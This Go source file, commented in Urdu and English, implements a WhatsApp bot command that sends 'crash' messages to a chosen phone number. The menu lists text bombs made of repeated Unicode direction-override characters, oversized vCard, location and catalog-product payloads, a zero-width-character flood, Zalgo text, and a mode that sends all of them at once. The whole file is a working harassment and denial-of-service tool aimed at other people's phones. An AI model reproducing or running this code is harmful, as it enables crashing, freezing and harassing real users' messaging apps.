package main

import (
	"context"
	"fmt"
	"strings"

	"go.mau.fi/whatsmeow"
	// 👇 پروٹوکول کا نیا راستہ (New Path)
	waProto "go.mau.fi/whatsmeow/binary/proto" 
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
	"google.golang.org/protobuf/proto"
)

// ---------------------------------------------------------
// 🏗️ HELPER 1: افقی وائرس (Horizontal/Length)
// ---------------------------------------------------------
func generateCrashPayload(length int) string {
	// \u202c (PDF) کو نکال دیا ہے تاکہ لیئرز بند نہ ہوں
	openers := "\u202e\u202b\u202d" 
	return strings.Repeat(openers, length)
}

// ---------------------------------------------------------
// 🏗️ HELPER 2: عمودی وائرس (Vertical/Zalgo) - Case 5
// ---------------------------------------------------------
func generateZalgoPayload() string {
	base := "﷽" // Heavy Char
	// Combining Marks (جو لفظ کے اوپر نیچے لگتے ہیں)
	marks := []string{
		"\u0310", "\u0312", "\u0313", "\u0314", "\u0315", "\u033e", "\u033f", "\u0340", 
		"\u0341", "\u0342", "\u0343", "\u0344", "\u0345", "\u0346", "\u0347", "\u0348",
		"\u0350", "\u0351", "\u0352", "\u0357", "\u0358", "\u035d", "\u035e", "\u0360",
	}

	var payload string
	payload += "⚠️ SYSTEM OVERLOAD ⚠️\n"
	
	// 200 الفاظ، ہر لفظ 50 منزلہ عمارت
	for i := 0; i < 200; i++ {
		payload += base
		for j := 0; j < 50; j++ {
			for _, m := range marks {
				payload += m
			}
		}
		payload += " "
	}
	return payload
}

// ---------------------------------------------------------
// 🚀 BUG COMMAND HANDLER (1-7)
// ---------------------------------------------------------
func handleSendBugs(client *whatsmeow.Client, v *events.Message, args []string) {
	// اگر آرگومنٹس کم ہیں تو لسٹ دکھا دو
	if len(args) < 2 {
		replyMessage(client, v, `⚠️ *Crash Menu:*
1. Text Bomb (Nesting)
2. VCard Bomb (Contact)
3. Location Bomb (Map)
4. Memory Flood (Invisible)
5. Zalgo Text (Vertical) 🆕
6. Catalog Bomb (Heavy) 🆕
7. 🔥 MIXER (ALL IN ONE)`)
		return
	}

	bugType := strings.ToLower(args[0])
	targetNum := args[1]

	// 1. نمبر فارمیٹنگ
	if !strings.Contains(targetNum, "@") {
		targetNum += "@s.whatsapp.net"
	}
	jid, err := types.ParseJID(targetNum)
	if err != nil {
		replyMessage(client, v, "❌ غلط نمبر!")
		return
	}

	replyMessage(client, v, "🚀 Launching Level "+bugType+" Attack...")

	// 2. ایکشنز
	switch bugType {
	
	case "1": // Text Bomb
		payload := "🚨 T-BUG 1 🚨\n" + generateCrashPayload(2500)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			Conversation: proto.String(payload),
		})

	case "2": // VCard Bomb
		virusName := generateCrashPayload(2000)
		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nEND:VCARD", virusName, virusName)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ContactMessage: &waProto.ContactMessage{
				DisplayName: proto.String("🔥 Virus 🔥"),
				Vcard:       proto.String(vcard),
			},
		})

	case "3": // Location Bomb
		virusAddr := generateCrashPayload(2000)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			LocationMessage: &waProto.LocationMessage{
				DegreesLatitude: proto.Float64(24.8607), DegreesLongitude: proto.Float64(67.0011),
				Name: proto.String("🚨 Crash Point"), Address: proto.String(virusAddr),
			},
		})

	case "4": // Memory Flood
		flood := strings.Repeat("\u200b\u200c\u200d", 8000)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{
				Text: proto.String("🚨 SILENT 🚨" + flood),
			},
		})

	case "5": // Zalgo (Vertical Attack) - NEW
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{
				Text: proto.String(generateZalgoPayload()),
			},
		})

	case "6": // Catalog/Product Bomb - NEW
		// یہ ایک جعلی پروڈکٹ بھیجے گا جس کی ڈسکرپشن بہت ہیوی ہوگی
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ProductMessage: &waProto.ProductMessage{
				Product: &waProto.ProductSnapshot{
					ProductId: proto.String("999999"),
					Title: proto.String("💣 HEAVY LOAD 💣"),
					Description: proto.String(generateCrashPayload(3000)), // Description میں وائرس
					CurrencyCode: proto.String("PKR"),
					PriceAmount1000: proto.Int64(0),
				},
				BusinessOwnerJid: proto.String(jid.String()), // ٹارگٹ کو ہی اونر بنا دیا
			},
		})

	// 🔥 CASE 7: THE ULTIMATE MIXER (سب کچھ ایک ساتھ)
	case "7", "all":
		// 1. Text
		client.SendMessage(context.Background(), jid, &waProto.Message{Conversation: proto.String(generateCrashPayload(2500))})
		// 2. VCard
		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nEND:VCARD", generateCrashPayload(1500), "VIRUS")
		client.SendMessage(context.Background(), jid, &waProto.Message{ContactMessage: &waProto.ContactMessage{DisplayName: proto.String("☠️"), Vcard: proto.String(vcard)}})
		// 3. Location
		client.SendMessage(context.Background(), jid, &waProto.Message{LocationMessage: &waProto.LocationMessage{DegreesLatitude: proto.Float64(0), DegreesLongitude: proto.Float64(0), Address: proto.String(generateCrashPayload(2000))}})
		// 4. Zalgo
		client.SendMessage(context.Background(), jid, &waProto.Message{ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(generateZalgoPayload())}})
		// 5. Catalog
		client.SendMessage(context.Background(), jid, &waProto.Message{ProductMessage: &waProto.ProductMessage{Product: &waProto.ProductSnapshot{ProductId: proto.String("666"), Title: proto.String("🔥"), Description: proto.String(generateCrashPayload(3000))}, BusinessOwnerJid: proto.String(jid.String())}})

		replyMessage(client, v, "✅ All 5 Warheads Delivered! 💀")

	default:
		replyMessage(client, v, "❌ غلط ٹائپ! 1 سے 7 تک سلیکٹ کریں۔")
	}
}

// Helper Function (Same as before)
